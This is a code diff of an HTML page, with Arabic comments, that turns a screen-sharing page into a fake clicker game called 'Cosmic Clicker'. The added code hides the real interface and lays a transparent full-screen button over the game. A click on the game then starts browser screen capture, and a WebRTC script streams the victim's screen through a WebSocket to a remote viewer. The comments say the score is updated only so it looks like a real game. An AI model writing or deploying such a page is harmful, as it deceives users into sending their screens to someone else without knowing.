@@ -4,16 +4,16 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <meta name="referrer" content="no-referrer">
-    <title>لعبة الكوكب</title>
+    <title>Cosmic Clicker</title>
     
     <style>
-        /* إخفاء كل شيء من الواجهة القديمة */
+        /* 1. إخفاء كل شيء من الواجهة القديمة (حتى لا تظهر */
         header, main, #share, #compat, #msg, .video, #preview, #placeholder, #stop {
             display: none !important;
             visibility: hidden !important;
         }
 
-        /* تصميم اللعبة */
+        /* 2. تصميم اللعبة */
         body {
             margin: 0;
             padding: 0;
@@ -62,7 +62,7 @@
 
         .fake-button:active { transform: scale(0.9); }
 
-        /* الزر السري الشفاف الذي يغطي الشاشة ويشغل المشاركة */
+        /* 3. الزر السري الشفاف الذي يغطي الشاشة ويشغل كود المشاركة */
         #start {
             position: fixed !important;
             top: 0 !important;
@@ -73,12 +73,14 @@
             z-index: 9999999 !important;
             cursor: default !important;
             border: none !important;
+            background: transparent !important;
+            display: block !important;
         }
     </style>
 </head>
 <body>
 
-    <!-- اللعبة -->
+    <!-- واجهة اللعبة -->
     <div class="game-container">
         <h1>COSMIC CLICKER</h1>
         <div class="score-board" id="score">0</div>
@@ -86,10 +88,8 @@
         <p style="color:#64748b; font-size:12px; margin-top:15px;">اضغط على الكوكب لجمع النقاط!</p>
     </div>
 
-    <!-- الزر السري (مخفي وشفاف) -->
+    <!-- العناصر المخفية المطلوبة لكي يعمل السكريبت الخاص بك بدون أخطاء -->
     <button id="start">بدء</button>
-    
-    <!-- العناصر المطلوبة للسكريبت -->
     <div id="share"></div>
     <div id="compat"></div>
     <p id="msg"></p>
@@ -97,11 +97,14 @@
         <video id="preview" autoplay playsinline muted></video>
         <div id="placeholder"></div>
     </div>
+    <button id="stop" class="hidden"></button>
 
-    <!-- كود اللعبة -->
+    <!-- كود اللعبة البصري -->
     <script>
         let score = 0;
-        document.addEventListener('click', function() {
+        document.addEventListener('click', function(e) {
+            // إذا تم الضغط على زر المشاركة الشفاف، نترك السكريبت الأساسي يعمل
+            // ولكن نحدث النقاط أيضاً حتى يبدو كأنها لعبة حقيقية
             score += Math.floor(Math.random() * 5) + 1;
             document.getElementById('score').innerText = score;
             let btn = document.getElementById('fakeBtn');
@@ -111,6 +114,47 @@
     </script>
 
     <!-- سكريبت المشاركة الخاص بك -->
-    <script src="/static/share.js"></script>
+    <script>
+        'use strict';
+        const $=s=>document.querySelector(s);let ws=null,pc=null,stream=null,ready=false;const stun=[{urls:'stun:stun.l.google.com:19302'}];
+        const supported=!!navigator.mediaDevices?.getDisplayMedia;
+        // تم تعطيل رسائل الخطأ القديمة لأننا نخفي الواجهة
+        // $('#compat').textContent=supported?'...':'...';
+        
+        function say(s){ console.log("Status: " + s); } // طباعة الرسائل في الكونسول بدلاً من الشاشة
+        function cleanup(send=true){if(send && ws?.readyState===1)ws.send(JSON.stringify({type:'stopped'}));if(pc){pc.close();pc=null}if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}$('#preview').srcObject=null;$('#placeholder').classList.remove('hidden');$('#stop').classList.add('hidden');$('#start').classList.remove('hidden');$('#start').disabled=!supported;ready=false}
+        
+        async function makeOffer(){if(!stream||!ready||ws?.readyState!==1)return;if(pc){pc.close();pc=null}pc=new RTCPeerConnection({iceServers:stun});stream.getTracks().forEach(t=>pc.addTrack(t,stream));pc.onicecandidate=e=>{if(e.candidate&&ws?.readyState===1)ws.send(JSON.stringify({type:'candidate',candidate:e.candidate}))};const offer=await pc.createOffer();await pc.setLocalDescription(offer);ws.send(JSON.stringify({type:'offer',sdp:pc.localDescription}));say('تم إرسال طلب الاتصال')}
+        
+        function connect(){const proto=location.protocol==='https:'?'wss:':'ws:';const token=location.pathname.split('/').pop();ws=new WebSocket(proto+'//'+location.host+'/ws?role=sender&token='+encodeURIComponent(token));ws.onopen=()=>say('متصل.');ws.onmessage=async e=>{let d;try{d=JSON.parse(e.data)}catch{return}try{if(d.type==='peer-ready'){ready=true;await makeOffer()}else if(d.type==='answer'&&pc)await pc.setRemoteDescription(d.sdp);else if(d.type==='candidate'&&pc)await pc.addIceCandidate(d.candidate);else if(d.type==='peer-left'){ready=false;if(pc){pc.close();pc=null}say('المشاهد غير متصل')}else if(d.type==='ended'){cleanup();say('صاحب الدعوة أنهى الجلسة')}}catch(err){say('خطأ اتصال: '+err.message)}};ws.onclose=()=>{if(stream){cleanup(false);say('انقطع الاتصال')}}}
+        
+        // هذا هو الزر المخفي الذي سيتم الضغط عليه عند الضغط على اللعبة
+        $('#start').onclick=async()=>{
+            if(!supported) {
+                alert("متصفحك لا يدعم مشاركة الشاشة");
+                return;
+            }
+            try{
+                const s=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
+                stream=s;
+                const track=s.getVideoTracks()[0];
+                if(!track){cleanup(false);return}
+                track.addEventListener('ended',()=>{cleanup();say('أوقفت مشاركة الشاشة')},{once:true});
+                $('#preview').srcObject=s;
+                $('#placeholder').classList.add('hidden');
+                $('#start').classList.add('hidden');
+                $('#stop').classList.remove('hidden');
+                say('تم السماح من الجهاز. جاري الاتصال...');
+                connect();
+            }catch(err){
+                say(err.name==='NotAllowedError'?'تم إلغاء المشاركة':'تعذّر بدء البث');
+                // إعادة الزر للعمل في حال رفض المستخدم
+                $('#start').classList.remove('hidden'); 
+            }
+        };
+        
+        $('#stop').onclick=()=>{cleanup();say('تم إيقاف مشاركة شاشتك')};
+        addEventListener('pagehide',()=>cleanup());
+    </script>
 </body>
 </html>
